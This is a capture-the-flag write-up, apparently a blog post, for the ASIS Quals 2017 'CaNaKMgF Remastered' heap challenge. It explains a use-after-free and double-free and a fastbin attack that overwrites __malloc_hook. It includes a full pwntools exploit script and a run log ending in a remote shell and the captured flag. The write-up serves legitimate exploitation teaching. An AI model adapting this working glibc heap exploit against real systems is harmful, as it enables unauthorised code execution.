---
layout: post
title: ASIS Quals CTF 2017 - CaNaKMgF Remastered
published: True
---

**Points:** 384
**Solves:** 25
**Category:** Exploitation 

> [CaNaKMgF_remastered](../binaries/CaNaKMgF_remastered)

{% highlight bash %}
CaNaKMgF_remastered: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e4ba2a9e3c69441f88481b5e06ac21fd52c54b9a, not stripped
{% endhighlight %}

{% highlight python%}
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
{% endhighlight %}

## Intro
This program is based off the `CaNaKMgF` pwnable challenge, except that `CaNaKMgF_remastered` has full RELRO enabled and PIE enabled. Interestingly, during the CTF, I had already solved `CaNaKMgF` using a technique that bypassed both mitigations, so I re-used the same exploit for `CaNaKMgF_remastered` and was able to get the flag.

## Reversing
When we run the program, we are presented with the following menu.

{% highlight bash %}
1. Allocate
2. Pray for Allah
3. Free
4. Read
5. Run away
{% endhighlight %}

The program is very simple. It allows us to allocate heap chunks of different sizes, which it places in a global array in the .BSS called `alloc_list[]`. 
We can write data of our choosing into these chunks and the the program ensures that the length of our data fits inside the chunk we've allocated for it.  
We can specify chunks from this list that we would like to print out the contents of.
Similarly, we can also free any chunks in this list.
 
There was also some functionality to read limited files off the remote server when one selected the "Pray for Allah" option in the `CaNaKMgF` binary, but this function no longer worked in `CaNaKMgF_remastered`, and I didn't use it in my exploit for `CaNaKMgF`, anyway.

## Exploit
The main vulnerability in this program is that when a chunk is freed, the associated pointer to the chunk is not removed from `alloc_list[]`. This allows us to perform **use-after-frees** and **double-frees** which we can abuse to corrupt the heap and gain code execution.

To get a libc leak, we can exploit the **UAF** to allocate 2 small chunks, free one of them and then print its contents out, since we know the `FD` and `BK` pointers of our free'd small chunk will be populated with a pointer to an offset from `main_arena` in libc.

To get control of `RIP`, we can perform a **fastbin attack** to get `malloc()` to return an almost arbitrary pointer, overwrite `__malloc_hook`, and then call our overwritten `__malloc_hook` function pointer by triggering a double free memory corruption error.

To perform the **fastbin attack**, we will allocate 2 fast chunks of size `0x68` bytes, and free the 2nd one, then the 1st one, and then the 2nd one again, abusing the fact that we can double-free fast chunks, so long as the head of the freelist that their fast chunk size is associated with, is not the same as the chunk that is being free'd.  

from `malloc.c`:
{% highlight C %}
if (__builtin_expect (old == p, 0))
  {
    errstr = "double free or corruption (fasttop)";
    goto errout;
  }
{% endhighlight %}

So, right now our fastbin looks like this:

[HEAD]->D->C->D->NULL 

Now, we will allocate another fast chunk of the same size as D, so that D is popped off this freelist and used to service our `malloc()` request.

Since we can also specify the contents of chunks we allocate, we will overwrite the first qword of this chunk with the address of our target that we would like `malloc()` to return.

**This corrupts the `FD` pointer of chunk D, a pointer to  which, still exists in the singly linked freelist!** 

We can select any address to overwrite the `FD` pointer with, subject to certain constraints. 

from `malloc.c`:
{% highlight C %}
 if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp = *fb;
      do
        {
          victim = pp;
          if (victim == NULL)
            break;
        }
      while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
             != victim);
      if (victim != 0)
        {
          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
            {
              errstr = "malloc(): memory corruption (fast)";
            errout:
              malloc_printerr (check_action, errstr, chunk2mem (victim), av);
              return NULL;
            }
          check_remalloced_chunk (av, victim, nb);
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
{% endhighlight %}

To satisfy these constraints, we will abuse the fact that we can make `FD` point to misaligned addresses as long as they satisfy the valid size metadata field constraint. In our case, since we are targeting fast chunks of size `0x68`, the following is a valid address should do the trick.

{% highlight C %}
gdb-peda$ p &__malloc_hook
$2 = (void *(**)(size_t, const void *)) 0x7ffff7dd1b10 <__malloc_hook>
gdb-peda$ x/32xg 0x7ffff7dd1b10-0x30+0xd
0x7ffff7dd1aed <_IO_wide_data_0+301>:   0xfff7dd0260000000      0x000000000000007f 
0x7ffff7dd1afd:                         0xfff7a93270000000      0xfff7a92e5000007f 
0x7ffff7dd1b0d <__realloc_hook+5>:      0xfff7a92c8000007f      0x000000000000007f
0x7ffff7dd1b1d:                         0x0000000000000000      0x0000000000000000
{% endhighlight %}

At this point, our freelist should now look like this:

[HEAD]->C->D->{target addr}

After two more allocations, our target address should now be at the head of this freelist:

[HEAD]->{target addr}

Then, the next memory allocation of size `0x68` should return a pointer to our target address and since we can control the contents of chunks we allocate, we  will simply overwrite `__malloc_hook` with a **"magic" one gadget RCE** address.

Once we trigger an actual double free corruption error, the program should now spawn a shell.

## exploit.py
{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

def allocate(length, contents):
    r.sendline("1")
    r.recvuntil("Length?")
    r.sendline(str(length))
    r.sendline(contents)
    r.recvuntil("away")

def free(idx):
    r.sendline("3")
    r.recvuntil("Num? ")
    r.sendline(str(idx))
    r.recvuntil("away")

def read(idx):
    r.sendline("4")
    r.recvuntil("Num? ")
    r.sendline(str(idx)) 
    return r.recvuntil("away")

def exploit(r):
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    
    # leak libc
    log.info("starting leaks...")
    allocate(255,"A")
    allocate(255,"B")
    free(0)

    libc_base = u64(read(0)[:6].ljust(8,'\0'))-0x3c3b78
    malloc_hook  = libc_base+libc.symbols["__malloc_hook"]
    one_shot = libc_base+0xef6c4
    log.success("libc base found at: "+hex(libc_base)) 
    log.success("one_shot found at: "+hex(one_shot)+"\n\n") 

    ## fastbin attack
    log.info("starting fastbin attack...")
    allocate(0x68,"C") # C # 2
    allocate(0x68,"D") # D # 3
    allocate(255, "E") # E
    
    free(3)
    free(2)
    free(3)

    # overwrite __malloc_hook
    payload = p64(malloc_hook-0x30+0xd)
    allocate(0x68, payload)
    allocate(0x68, "F")
    allocate(0x68, "G")
    allocate(0x68,"H"*0x13+p64(one_shot))
    free(0)
   
    # trigger
    r.sendline("3")
    r.sendline("0") 
    
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./CaNaKMgF_remastered'], env={"LD_PRELOAD":""})
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}

{% highlight text %}
➜  CaNaKMgF_remastered python exploit.py 128.199.85.217 10001
[*] For remote: exploit.py HOST PORT
[+] Opening connection to 128.199.85.217 on port 10001: Done
[*] '/lib/x86_64-linux-gnu/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] starting leaks...
[+] libc base found at: 0x7f80b7c9f000
[+] one_shot found at: 0x7f80b7d8e6c4
    
[*] starting fastbin attack...
[*] Switching to interactive mode

Num? $ id
uid=1000(pwn) gid=1000(pwn) groups=1000(pwn)
$ ls
CaNaKMgF
F1Ag_FiLe_Is_Heeereeeeeee_HAHAHA
$ cat F1Ag_FiLe_Is_Heeereeeeeee_HAHAHA
ASIS{full_relro_fastbin_attack!!!!!!_:-P}
$
{% endhighlight %}
